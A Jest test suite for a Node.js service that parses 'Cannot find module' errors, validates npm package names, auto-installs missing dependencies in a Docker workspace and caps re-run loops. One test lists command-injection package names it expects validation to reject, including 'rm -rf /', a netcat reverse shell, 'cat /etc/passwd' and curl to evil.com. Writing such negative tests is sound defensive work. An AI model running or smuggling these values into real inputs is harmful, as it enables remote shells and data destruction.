import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { jest, describe, it, expect, beforeEach, afterEach } from "@jest/globals";

// Mock dockerRunner before importing services
const mockDockerRun = jest.fn();
await jest.unstable_mockModule("../services/dockerRunner.service.js", () => ({
    dockerRunner: { run: mockDockerRun },
    cleanupProjectRunnerContainers: jest.fn().mockResolvedValue({ success: true, removedCount: 0 })
}));

const mockPrisma = {
    projectSnapshot: {
        findUnique: jest.fn(),
        update: jest.fn().mockResolvedValue({})
    },
    coverageFile: {
        findMany: jest.fn().mockResolvedValue([]),
        upsert: jest.fn().mockResolvedValue({})
    },
    coverageSummary: {
        findUnique: jest.fn().mockResolvedValue(null),
        upsert: jest.fn().mockResolvedValue({})
    },
    testRun: {
        create: jest.fn().mockResolvedValue({ id: "tr-stress-1" }),
        findFirst: jest.fn().mockResolvedValue(null)
    },
    $transaction: jest.fn(fn => typeof fn === "function" ? fn(mockPrisma) : Promise.resolve())
};
await jest.unstable_mockModule("../config/prisma.js", () => ({
    default: mockPrisma,
    prisma: mockPrisma
}));

const {
    extractMissingDependency,
    isValidNpmPackageName,
    installPackageInWorkspace,
    inspectWorkspaceDependency,
    ensureWorkspaceNodeModulesLinked,
    findTargetPackageDir,
    NODE_BUILTINS
} = await import("../services/dependencyResolution.service.js");

const { applyUnitTestSuggestion, activeApplyLocks } = await import("../services/applyTestSuggestion.service.js");
const { parseModuleResolutionError } = await import("../services/runTestsJob.service.js");

describe("Empirical Challenger R1: Adversarial Stress Test Suite", () => {
    let tempDir;

    beforeEach(() => {
        tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "covai-challenger-r1-"));
        jest.clearAllMocks();
        mockDockerRun.mockResolvedValue({
            success: true,
            exitCode: 0,
            stdout: "added 1 package",
            stderr: ""
        });
    });

    afterEach(() => {
        activeApplyLocks.clear();
        try {
            fs.rmSync(tempDir, { recursive: true, force: true });
        } catch (_) { }
    });

    // ─────────────────────────────────────────────────────────────────────────────
    // Dimension 1: Edge-case Mining & Adversarial Inputs for Dependency Extraction
    // ─────────────────────────────────────────────────────────────────────────────
    describe("Dimension 1: Dependency Extraction & Validation Under Adversarial Inputs", () => {
        it("handles deep subpaths in scoped packages (e.g., @apollo/client/link/error/index.js)", () => {
            const output = "Error: Cannot find module '@apollo/client/link/error/index.js' from 'src/graphql/client.ts'";
            const dep = extractMissingDependency(output);
            expect(dep).not.toBeNull();
            expect(dep.packageName).toBe("@apollo/client");
            expect(dep.rawSpecifier).toBe("@apollo/client/link/error/index.js");
            expect(dep.importedFrom).toBe("src/graphql/client.ts");
            expect(isValidNpmPackageName(dep.packageName)).toBe(true);
        });

        it("handles deep subpaths in unscoped packages (e.g., date-fns/locale/vi/index.js)", () => {
            const output = "Failed to resolve import \"date-fns/locale/vi/index.js\" from \"src/format.ts\"";
            const dep = extractMissingDependency(output);
            expect(dep).not.toBeNull();
            expect(dep.packageName).toBe("date-fns");
            expect(dep.rawSpecifier).toBe("date-fns/locale/vi/index.js");
            expect(isValidNpmPackageName(dep.packageName)).toBe(true);
        });

        it("strips version tags attached in require specifiers (e.g., mathjs@^12.0.0)", () => {
            const output = "Cannot find module 'mathjs@^12.0.0' from 'src/calc.js'";
            const dep = extractMissingDependency(output);
            expect(dep).not.toBeNull();
            expect(dep.packageName).toBe("mathjs");
        });

        it("rejects malformed scoped packages missing package sub-name (@only-scope)", () => {
            expect(isValidNpmPackageName("@myorg")).toBe(false);
            expect(isValidNpmPackageName("@myorg/")).toBe(false);
            expect(isValidNpmPackageName("@/my-package")).toBe(false);
        });

        it("rejects dangerous shell metacharacters and line injection vectors", () => {
            const adversarialNames = [
                "razorpay\nrm -rf /",
                "razorpay\r\nrm -rf /",
                "razorpay; cat /etc/passwd",
                "razorpay && whoami",
                "razorpay | nc -e /bin/sh 10.0.0.1",
                "razorpay`curl evil.com`",
                "razorpay$(whoami)",
                "razorpay > /tmp/pwned",
                "razorpay < /dev/zero",
                "razorpay & bg",
                "razorpay\\0hidden",
                "../razorpay",
                "/razorpay"
            ];

            for (const name of adversarialNames) {
                expect(isValidNpmPackageName(name)).toBe(false);
                expect(extractMissingDependency(`Cannot find module '${name}'`)).toBeNull();
            }
        });

        it("ignores all Node.js built-ins including prefixed ones", () => {
            for (const builtin of NODE_BUILTINS) {
                const output = `Cannot find module '${builtin}' from 'src/index.js'`;
                expect(extractMissingDependency(output)).toBeNull();
            }
        });

        it("ignores relative paths and Windows/POSIX paths without misidentifying them as packages", () => {
            const internalPaths = [
                "Cannot find module './services/payment' from 'tests/payment.test.js'",
                "Cannot find module '../utils/validator' from 'tests/payment.test.js'",
                "Cannot find module '../../config/db' from 'src/index.js'",
                "Cannot find module '/app/storage/projects/p1/service.js' from 'tests/run.js'",
                "Cannot find module 'C:\\projects\\app\\service.js' from 'tests/run.js'"
            ];

            for (const line of internalPaths) {
                expect(extractMissingDependency(line)).toBeNull();
            }
        });

        it("correctly parses error output amidst heavy ANSI color codes and stack frames", () => {
            const noisyOutput = `
\u001b[1m\u001b[31mFAIL\u001b[39m\u001b[22m src/tests/checkout.test.ts
  \u001b[1m● \u001b[22mTest suite failed to run

    Cannot find module '\u001b[4mrazorpay\u001b[24m' from 'src/services/checkout.service.ts'

    \u001b[2m  1 |\u001b[22m import Razorpay from 'razorpay';
    \u001b[2m  2 |\u001b[22m
    \u001b[2m    at Resolver._throwModNotFoundError (node_modules/jest-resolve/build/resolver.js:427:11)\u001b[22m
    \u001b[2m    at Object.<anonymous> (src/services/checkout.service.ts:1:1)\u001b[22m
            `;
            // Clean ANSI if any or verify extractMissingDependency on sanitized output
            const strippedAnsi = noisyOutput.replace(/\u001b\[[0-9;]*m/g, "");
            const dep = extractMissingDependency(strippedAnsi);
            expect(dep).not.toBeNull();
            expect(dep.packageName).toBe("razorpay");
            expect(dep.importedFrom).toBe("src/services/checkout.service.ts");
        });
    });

    // ─────────────────────────────────────────────────────────────────────────────
    // Dimension 2: Installation Failure Modes & Timeout Resilience
    // ─────────────────────────────────────────────────────────────────────────────
    describe("Dimension 2: Installation Failure Modes & Timeout Resilience", () => {
        it("does NOT throw when npm registry times out (ETIMEDOUT)", async () => {
            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "timeout-app" }));
            mockDockerRun.mockRejectedValueOnce(new Error("connect ETIMEDOUT 104.16.16.35:443"));

            const result = await installPackageInWorkspace({
                rootDir: tempDir,
                packageName: "razorpay",
                isDev: false,
                jobId: "job-timeout-test"
            });

            expect(result.success).toBe(false);
            expect(result.timedOut).toBe(true);
            expect(result.exitCode).toBe(408);
            expect(result.stderr).toContain("ETIMEDOUT");
        });

        it("does NOT throw when package is not found in npm registry (404 E404)", async () => {
            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "e404-app" }));
            mockDockerRun.mockResolvedValueOnce({
                success: false,
                exitCode: 1,
                stdout: "",
                stderr: "npm ERR! 404 Not Found - GET https://registry.npmjs.org/@covai-nonexistent/invalid-package-404"
            });

            const result = await installPackageInWorkspace({
                rootDir: tempDir,
                packageName: "@covai-nonexistent/invalid-package-404",
                isDev: false,
                jobId: "job-e404"
            });

            expect(result.success).toBe(false);
            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("404 Not Found");
        });

        it("allocates 60s timeout for background BullMQ jobs and 30s for synchronous callers", async () => {
            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "timeout-budget-app" }));

            // Case A: Background job with jobId
            await installPackageInWorkspace({
                rootDir: tempDir,
                packageName: "razorpay",
                jobId: "bull-job-123"
            });
            expect(mockDockerRun).toHaveBeenLastCalledWith(expect.objectContaining({
                timeoutMs: 60000
            }));

            // Case B: Synchronous call without jobId
            await installPackageInWorkspace({
                rootDir: tempDir,
                packageName: "razorpay",
                jobId: null
            });
            expect(mockDockerRun).toHaveBeenLastCalledWith(expect.objectContaining({
                timeoutMs: 30000
            }));
        });

        it("preserves existing package.json keys, scripts, and devDependencies without clobbering", async () => {
            const originalPkg = {
                name: "ecommerce-core",
                version: "2.1.0",
                scripts: { test: "jest --coverage", build: "tsc" },
                dependencies: { express: "^4.18.2" },
                devDependencies: { jest: "^29.7.0" }
            };
            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify(originalPkg, null, 2));

            await installPackageInWorkspace({
                rootDir: tempDir,
                packageName: "razorpay",
                isDev: false
            });

            const updatedPkg = JSON.parse(fs.readFileSync(path.join(tempDir, "package.json"), "utf8"));
            expect(updatedPkg.name).toBe("ecommerce-core");
            expect(updatedPkg.version).toBe("2.1.0");
            expect(updatedPkg.scripts.test).toBe("jest --coverage");
            expect(updatedPkg.dependencies.express).toBe("^4.18.2");
            expect(updatedPkg.dependencies.razorpay).toBe("^latest");
            expect(updatedPkg.devDependencies.jest).toBe("^29.7.0");
        });
    });

    // ─────────────────────────────────────────────────────────────────────────────
    // Dimension 3: In-Flight Loop Guard & Re-Run Logic Simulation
    // ─────────────────────────────────────────────────────────────────────────────
    describe("Dimension 3: In-Flight Loop Guard & Auto-Recovery State Machine", () => {
        it("simulates the in-flight resolution loop: successfully installs razorpay and triggers test re-run", async () => {
            const attemptedDependencies = new Set();
            const MAX_DEP_ATTEMPTS = 3;
            let runIterations = 0;
            let finalCoverageAchieved = false;

            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "loop-test" }));

            // Test execution loop simulator matching runTestsJob.service.js
            while (true) {
                runIterations++;

                // Iteration 1: Fails due to missing 'razorpay'
                // Iteration 2: Pass!
                let runnerResult;
                let hasValidCoverage = false;
                let fullOutput = "";

                if (runIterations === 1) {
                    runnerResult = { exitCode: 1 };
                    fullOutput = "Cannot find module 'razorpay' from 'src/checkout.js'";
                } else {
                    runnerResult = { exitCode: 0 };
                    hasValidCoverage = true;
                    finalCoverageAchieved = true;
                }

                if (runnerResult.exitCode !== 0) {
                    const missingDep = extractMissingDependency(fullOutput);
                    if (!hasValidCoverage && missingDep?.packageName && isValidNpmPackageName(missingDep.packageName)) {
                        if (!attemptedDependencies.has(missingDep.packageName) && attemptedDependencies.size < MAX_DEP_ATTEMPTS) {
                            attemptedDependencies.add(missingDep.packageName);
                            const installRes = await installPackageInWorkspace({
                                rootDir: tempDir,
                                packageName: missingDep.packageName,
                                isDev: false
                            });
                            if (installRes?.success) {
                                continue; // Re-run tests!
                            }
                        }
                    }
                }
                break;
            }

            expect(runIterations).toBe(2);
            expect(finalCoverageAchieved).toBe(true);
            expect(attemptedDependencies.has("razorpay")).toBe(true);
            expect(mockDockerRun).toHaveBeenCalledTimes(1);
        });

        it("prevents infinite loop when package install succeeds but test still fails with SAME missing module", async () => {
            const attemptedDependencies = new Set();
            const MAX_DEP_ATTEMPTS = 3;
            let runIterations = 0;

            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "loop-same-dep" }));

            // Simulates: package installs fine, but test runner keeps reporting 'razorpay' missing (e.g. broken symlink)
            while (true) {
                runIterations++;
                const runnerResult = { exitCode: 1 };
                const hasValidCoverage = false;
                const fullOutput = "Cannot find module 'razorpay' from 'src/checkout.js'";

                if (runnerResult.exitCode !== 0) {
                    const missingDep = extractMissingDependency(fullOutput);
                    if (!hasValidCoverage && missingDep?.packageName && isValidNpmPackageName(missingDep.packageName)) {
                        if (!attemptedDependencies.has(missingDep.packageName) && attemptedDependencies.size < MAX_DEP_ATTEMPTS) {
                            attemptedDependencies.add(missingDep.packageName);
                            const installRes = await installPackageInWorkspace({
                                rootDir: tempDir,
                                packageName: missingDep.packageName,
                                isDev: false
                            });
                            if (installRes?.success) {
                                continue; // Re-run tests
                            }
                        }
                    }
                }
                break;
            }

            // Must terminate on iteration 2 because razorpay is already in attemptedDependencies!
            expect(runIterations).toBe(2);
            expect(attemptedDependencies.size).toBe(1);
            expect(mockDockerRun).toHaveBeenCalledTimes(1);
        });

        it("strictly halts at MAX_DEP_ATTEMPTS = 3 when encountering a cascade of 5 missing packages", async () => {
            const attemptedDependencies = new Set();
            const MAX_DEP_ATTEMPTS = 3;
            let runIterations = 0;

            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "cascade-dep" }));

            const cascadeErrors = [
                "Cannot find module 'pkg-1' from 'src/a.js'",
                "Cannot find module 'pkg-2' from 'src/b.js'",
                "Cannot find module 'pkg-3' from 'src/c.js'",
                "Cannot find module 'pkg-4' from 'src/d.js'",
                "Cannot find module 'pkg-5' from 'src/e.js'",
            ];

            while (true) {
                runIterations++;
                const runnerResult = { exitCode: 1 };
                const hasValidCoverage = false;
                const fullOutput = cascadeErrors[runIterations - 1] || "Cannot find module 'pkg-overflow'";

                if (runnerResult.exitCode !== 0) {
                    const missingDep = extractMissingDependency(fullOutput);
                    if (!hasValidCoverage && missingDep?.packageName && isValidNpmPackageName(missingDep.packageName)) {
                        if (!attemptedDependencies.has(missingDep.packageName) && attemptedDependencies.size < MAX_DEP_ATTEMPTS) {
                            attemptedDependencies.add(missingDep.packageName);
                            const installRes = await installPackageInWorkspace({
                                rootDir: tempDir,
                                packageName: missingDep.packageName,
                                isDev: false
                            });
                            if (installRes?.success) {
                                continue;
                            }
                        }
                    }
                }
                break;
            }

            // Iteration 1: Installs pkg-1 (attempted size = 1) -> continue
            // Iteration 2: Installs pkg-2 (attempted size = 2) -> continue
            // Iteration 3: Installs pkg-3 (attempted size = 3) -> continue
            // Iteration 4: Sees pkg-4. attemptedDependencies.size is 3 which is NOT < 3 -> breaks!
            expect(runIterations).toBe(4);
            expect(attemptedDependencies.size).toBe(3);
            expect(mockDockerRun).toHaveBeenCalledTimes(3);
            expect(attemptedDependencies.has("pkg-1")).toBe(true);
            expect(attemptedDependencies.has("pkg-2")).toBe(true);
            expect(attemptedDependencies.has("pkg-3")).toBe(true);
            expect(attemptedDependencies.has("pkg-4")).toBe(false);
        });

        it("gracefully breaks loop immediately when package installation fails", async () => {
            const attemptedDependencies = new Set();
            const MAX_DEP_ATTEMPTS = 3;
            let runIterations = 0;

            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({ name: "failed-install" }));
            mockDockerRun.mockResolvedValueOnce({
                success: false,
                exitCode: 1,
                stderr: "npm ERR! 404 Not Found"
            });

            while (true) {
                runIterations++;
                const runnerResult = { exitCode: 1 };
                const hasValidCoverage = false;
                const fullOutput = "Cannot find module 'broken-pkg' from 'src/index.js'";

                if (runnerResult.exitCode !== 0) {
                    const missingDep = extractMissingDependency(fullOutput);
                    if (!hasValidCoverage && missingDep?.packageName && isValidNpmPackageName(missingDep.packageName)) {
                        if (!attemptedDependencies.has(missingDep.packageName) && attemptedDependencies.size < MAX_DEP_ATTEMPTS) {
                            attemptedDependencies.add(missingDep.packageName);
                            const installRes = await installPackageInWorkspace({
                                rootDir: tempDir,
                                packageName: missingDep.packageName,
                                isDev: false
                            });
                            if (installRes?.success) {
                                continue;
                            }
                        }
                    }
                }
                break;
            }

            // Should terminate on iteration 1 because installRes.success is false!
            expect(runIterations).toBe(1);
            expect(attemptedDependencies.has("broken-pkg")).toBe(true);
        });
    });

    // ─────────────────────────────────────────────────────────────────────────────
    // Dimension 4: applyTestSuggestion Integration & Storage Immutability Guard
    // ─────────────────────────────────────────────────────────────────────────────
    describe("Dimension 4: applyTestSuggestion Undeclared Dependency Handling", () => {
        it("installs newly suggested package even when not listed in dependencies or devDependencies", async () => {
            fs.writeFileSync(path.join(tempDir, "package.json"), JSON.stringify({
                name: "backend-service",
                dependencies: { express: "^4.18.2" }
            }, null, 2));
            fs.mkdirSync(path.join(tempDir, "node_modules", "express"), { recursive: true });
            fs.mkdirSync(path.join(tempDir, "src"), { recursive: true });
            fs.writeFileSync(path.join(tempDir, "src/billing.js"), "export const bill = (x) => x;\n");

            mockPrisma.projectSnapshot.findUnique.mockResolvedValue({
                id: "snap-billing",
                projectId: "proj-billing",
                rootDir: tempDir
            });

            let runs = 0;
            const customRunCoverage = jest.fn().mockImplementation(async ({ sealedRunDir }) => {
                runs++;
                if (runs === 1) {
                    fs.writeFileSync(path.join(sealedRunDir, "jest-results.json"), JSON.stringify({
                        success: false,
                        numFailedTests: 1,
                        testResults: [{
                            name: path.join(sealedRunDir, "tests/billing.test.js"),
                            status: "failed",
                            assertionResults: [{
                                status: "failed",
                                title: "charges card",
                                failureMessages: ["Cannot find module 'stripe' from 'tests/billing.test.js'"]
                            }]
                        }]
                    }));
                } else {
                    fs.writeFileSync(path.join(sealedRunDir, "jest-results.json"), JSON.stringify({
                        success: true,
                        numPassedTests: 1,
                        numFailedTests: 0,
                        testResults: [{
                            name: path.join(sealedRunDir, "tests/billing.test.js"),
                            status: "passed",
                            assertionResults: [{ status: "passed", title: "charges card" }]
                        }]
                    }));
                    fs.writeFileSync(path.join(sealedRunDir, "coverage-summary.json"), JSON.stringify({
                        total: { statements: { total: 5, covered: 5, pct: 100 }, lines: { total: 5, covered: 5, pct: 100 } }
                    }));
                }
            });

            const applyRes = await applyUnitTestSuggestion({
                snapshotId: "snap-billing",
                projectId: "proj-billing",
                suggestion: {
                    sourceFile: "src/billing.js",
                    testFile: "tests/billing.test.js",
                    framework: "jest",
                    generatedCode: "const stripe = require('stripe'); test('charges card', () => { expect(stripe).toBeDefined(); });"
                },
                runCoverageFn: customRunCoverage
            });

            expect(applyRes.success).toBe(true);
            expect(runs).toBeGreaterThanOrEqual(2);

            const pkgAfter = JSON.parse(fs.readFileSync(path.join(tempDir, "package.json"), "utf8"));
            expect(pkgAfter.dependencies.stripe).toBe("^latest");
            // Verify original express dependency was not erased
            expect(pkgAfter.dependencies.express).toBe("^4.18.2");
        });
    });
});
